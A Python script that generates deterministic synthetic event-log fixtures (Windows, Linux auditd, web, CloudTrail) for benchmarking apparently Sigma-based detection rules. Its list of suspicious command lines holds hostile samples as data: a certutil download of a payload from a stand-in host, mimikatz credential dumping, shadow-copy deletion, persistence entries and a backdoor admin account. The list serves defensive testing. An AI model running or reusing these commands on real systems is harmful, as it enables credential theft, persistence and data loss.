#!/usr/bin/env python3
"""Deterministic event-lane generator for the performance baseline fixtures.

Generates the NDJSON event lanes used by the performance baseline and the
witness audit (see scripts/perf/fetch-fixtures.sh). Every lane is produced
from a fixed per-lane seed, so two runs of this script on any machine emit
byte-identical files.

Lanes:
  raw_windows        Raw Snare-style Windows event text in a single `message`
                     field (the shape syslog collectors forward when events
                     are not parsed into structured fields).
  structured_windows Sysmon/Security-shaped JSON with native SigmaHQ field
                     names (Image, CommandLine, ParentImage, ...).
  mixed_schema       Rotation of Windows process creation, Linux auditd-ish,
                     web access, and CloudTrail-ish shapes.
  no_match           Random hex tokens in unrelated fields; near-zero rule
                     matches by construction.
  low_match          structured_windows with ~1% suspicious command lines.
  match_heavy        Mostly suspicious command lines; stresses the match and
                     serialization paths.

Only the Python standard library is used.
"""

import argparse
import json
import random
import sys
from pathlib import Path

BENIGN_IMAGES = [
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\tasklist.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
    r"C:\Windows\System32\conhost.exe",
    r"C:\Windows\System32\wbem\WmiPrvSE.exe",
    r"C:\Program Files\Mozilla Firefox\firefox.exe",
    r"C:\Windows\System32\dllhost.exe",
    r"C:\Windows\System32\SearchIndexer.exe",
]

BENIGN_CMDLINES = [
    r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule",
    r"tasklist /svc /fo csv",
    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer',
    r"C:\Windows\System32\conhost.exe 0xffffffff -ForceV1",
    r'"C:\Program Files\Mozilla Firefox\firefox.exe" -contentproc --channel=1234',
    r"C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding",
    r"C:\Windows\System32\SearchIndexer.exe /Embedding",
    r'"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /recycle',
]

SUSPICIOUS_CMDLINES = [
    r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    r"rundll32.exe javascript:\..\mshtml,RunHTMLApplication",
    r"certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe C:\Users\Public\p.exe",
    r"whoami /priv",
    r"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
    r'reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v upd /d C:\Users\Public\u.exe',
    r"wmic process call create cmd.exe /c C:\Users\Public\stage2.bat",
    r"cmd.exe /c vssadmin delete shadows /all /quiet",
    r"schtasks /create /tn Updater /tr C:\Users\Public\u.exe /sc onlogon /ru SYSTEM",
    r"net user backdoor P@ssw0rd1 /add && net localgroup administrators backdoor /add",
]

PARENT_IMAGES = [
    r"C:\Windows\System32\services.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\System32\winlogon.exe",
]

USERS = [
    r"NT AUTHORITY\SYSTEM",
    r"CORP\alice",
    r"CORP\bob",
    r"CORP\svc-backup",
    r"NT AUTHORITY\NETWORK SERVICE",
]

HOSTS = ["ws-0042", "ws-1187", "srv-file01", "srv-dc01", "lt-3301"]


def hexes(rng, n):
    return "".join(rng.choice("0123456789abcdef") for _ in range(n))


def guid(rng):
    return f"{hexes(rng, 8)}-{hexes(rng, 4)}-{hexes(rng, 4)}-{hexes(rng, 4)}-{hexes(rng, 12)}"


def pick_cmdline(rng, suspicious_rate):
    if rng.random() < suspicious_rate:
        return rng.choice(SUSPICIOUS_CMDLINES)
    return rng.choice(BENIGN_CMDLINES)


def raw_windows_event(rng, suspicious_rate):
    """Snare-style MSWinEventLog line in a single `message` field."""
    host = rng.choice(HOSTS)
    cmd = pick_cmdline(rng, suspicious_rate)
    image = cmd.split()[0].strip('"')
    parent = rng.choice(PARENT_IMAGES)
    body = (
        "A new process has been created.    Creator Subject:   Security ID:  "
        f"{rng.choice(USERS)}   Account Name:  {host}$   Account Domain:  CORP   "
        f"Logon ID:  0x{hexes(rng, 3).upper()}    Target Subject:   Security ID:  \\NULL SID   "
        "Account Name:  -   Account Domain:  -   Logon ID:  0x0    Process Information:   "
        f"New Process ID:  0x{hexes(rng, 4)}   New Process Name: {image}   "
        "Token Elevation Type: %%1936   Mandatory Label:  Mandatory Label\\Medium Mandatory Level   "
        f"Creator Process ID: 0x{hexes(rng, 4)}   Creator Process Name: {parent}   "
        f"Process Command Line: {cmd}"
    )
    message = (
        f"<131>Jul 28 11:{rng.randrange(60):02d}:{rng.randrange(60):02d} {host}-hdr MSWinEventLog\t1\t"
        f"Security\t{rng.randrange(10**9, 10**10)}\tTue Jul 28 11:28:00 2026\t4688\t"
        f"Microsoft-Windows-Security-Auditing\t-\\-\tN/A\tSuccess Audit\t{host}\t"
        f"Process Creation\t\t{body}\t{rng.randrange(10**6, 10**7)}"
    )
    return {"message": message, "product": "windows"}


def structured_windows_event(rng, suspicious_rate):
    cmd = pick_cmdline(rng, suspicious_rate)
    image = cmd.split()[0].strip('"')
    if not image.startswith("C:"):
        image = rng.choice(BENIGN_IMAGES)
    return {
        "EventID": 1,
        "Image": image,
        "CommandLine": cmd,
        "ParentImage": rng.choice(PARENT_IMAGES),
        "ParentCommandLine": rng.choice(BENIGN_CMDLINES),
        "User": rng.choice(USERS),
        "IntegrityLevel": rng.choice(["Medium", "High", "System"]),
        "CurrentDirectory": r"C:\Windows\system32\\",
        "LogonId": f"0x{hexes(rng, 5)}",
        "ProcessId": rng.randrange(1000, 65000),
        "ParentProcessId": rng.randrange(1000, 65000),
        "ProcessGuid": guid(rng),
        "Hashes": f"SHA256={hexes(rng, 64).upper()}",
        "OriginalFileName": image.rsplit("\\", 1)[-1],
        "Computer": rng.choice(HOSTS),
        "UtcTime": f"2026-07-28 11:{rng.randrange(60):02d}:{rng.randrange(60):02d}.{rng.randrange(1000):03d}",
        "product": "windows",
        "category": "process_creation",
    }


def linux_auditd_event(rng):
    return {
        "type": "SYSCALL",
        "syscall": rng.choice(["59", "322", "42"]),
        "exe": rng.choice(["/usr/bin/bash", "/usr/bin/curl", "/usr/sbin/sshd", "/usr/bin/python3"]),
        "comm": rng.choice(["bash", "curl", "sshd", "python3"]),
        "uid": str(rng.randrange(0, 2000)),
        "auid": str(rng.randrange(1000, 2000)),
        "tty": rng.choice(["pts0", "(none)"]),
        "key": rng.choice(["exec_log", "network", "(null)"]),
        "product": "linux",
    }


def web_access_event(rng):
    return {
        "c-ip": f"203.0.113.{rng.randrange(1, 255)}",
        "cs-method": rng.choice(["GET", "POST", "HEAD"]),
        "cs-uri-query": rng.choice(
            ["/index.html", "/api/v1/users?id=42", "/login", "/static/app.js", "/health"]
        ),
        "sc-status": rng.choice([200, 200, 200, 301, 404, 500]),
        "cs-user-agent": rng.choice(
            [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "curl/8.5.0",
                "python-requests/2.32.0",
            ]
        ),
        "product": "webserver",
        "category": "webserver",
    }


def cloudtrail_event(rng):
    return {
        "eventSource": rng.choice(["s3.amazonaws.com", "iam.amazonaws.com", "ec2.amazonaws.com"]),
        "eventName": rng.choice(
            ["GetObject", "PutObject", "CreateUser", "RunInstances", "DescribeInstances"]
        ),
        "awsRegion": rng.choice(["us-east-1", "eu-west-1"]),
        "sourceIPAddress": f"198.51.100.{rng.randrange(1, 255)}",
        "userIdentity": {"type": "IAMUser", "userName": rng.choice(["deploy", "ci-bot", "admin"])},
        "product": "aws",
        "service": "cloudtrail",
    }


def no_match_event(rng):
    return {f"f{i}": hexes(rng, 24) for i in range(8)} | {"product": "synthetic"}


LANES = {
    # name: (seed, generator)
    "raw_windows": (11, lambda rng: raw_windows_event(rng, 0.10)),
    "structured_windows": (23, lambda rng: structured_windows_event(rng, 0.02)),
    "no_match": (47, no_match_event),
    "low_match": (59, lambda rng: structured_windows_event(rng, 0.01)),
    "match_heavy": (61, lambda rng: structured_windows_event(rng, 0.80)),
}


def mixed_schema_event(rng, i):
    kind = i % 4
    if kind == 0:
        return structured_windows_event(rng, 0.02)
    if kind == 1:
        return linux_auditd_event(rng)
    if kind == 2:
        return web_access_event(rng)
    return cloudtrail_event(rng)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--out-dir", required=True, help="directory to write lane files into")
    ap.add_argument("--count", type=int, default=10000, help="events per lane (default 10000)")
    args = ap.parse_args()

    out = Path(args.out_dir)
    out.mkdir(parents=True, exist_ok=True)

    for name, (seed, gen) in LANES.items():
        rng = random.Random(seed)
        path = out / f"{name}.ndjson"
        with path.open("w", encoding="utf-8") as f:
            for _ in range(args.count):
                f.write(json.dumps(gen(rng), separators=(",", ":")) + "\n")
        print(f"wrote {path} ({args.count} events)", file=sys.stderr)

    rng = random.Random(83)
    path = out / "mixed_schema.ndjson"
    with path.open("w", encoding="utf-8") as f:
        for i in range(args.count):
            f.write(json.dumps(mixed_schema_event(rng, i), separators=(",", ":")) + "\n")
    print(f"wrote {path} ({args.count} events)", file=sys.stderr)


if __name__ == "__main__":
    main()
